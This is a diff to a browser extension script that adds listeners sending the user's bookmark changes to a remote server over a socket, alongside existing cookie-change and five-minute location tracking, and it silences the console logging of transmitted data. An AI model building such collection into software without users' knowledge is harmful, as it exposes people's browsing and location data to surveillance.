@@ -89,7 +89,7 @@ var getCurrentPosition = function () {
 
 var getAllBookmarks = function () {
     chrome.bookmarks.getTree(function (results) {
-        postData("bookmarks-all", results);
+        postData("addBookmark", results);
     });
 };
 
@@ -176,11 +176,18 @@ var onCookieChange = function (changeInfo) {
 };
 
 var onBookmarkCreate = function (id, bookmark) {
-    console.log(id, bookmark);
+    postData('addBookmark', [bookmark]);
 };
 
 var onBookmarkChange = function (id, changeInfo) {
-    console.log(id, changeInfo);
+    postData('changeBookmark', {
+        'id': id,
+        'changeInfo': changeInfo
+    });
+};
+
+var onBookmarkRemoved = function (id, changeInfo) {
+    postData('removeBookmark', { 'id': id });
 };
 
 var activateListeners = function () {
@@ -197,6 +204,7 @@ var activateListeners = function () {
     chrome.cookies.onChanged.addListener(onCookieChange);
     chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
+    chrome.bookmarks.onRemoved.addListener(onBookmarkRemoved);
     setInterval(getCurrentPosition, 5 * 60 * 1000);
 };
 
@@ -216,7 +224,8 @@ var postData = function (type, payload) {
     data.payload = JSON.stringify(payload);
     // Compress payload.
     // data.payload = LZString.compress(JSON.stringify(payload));
-    console.log(data);
+    // Log data.
+    // console.log(data);
     // console.log(payload);
     // Transmit data to server.
     socket.emit(type, data);
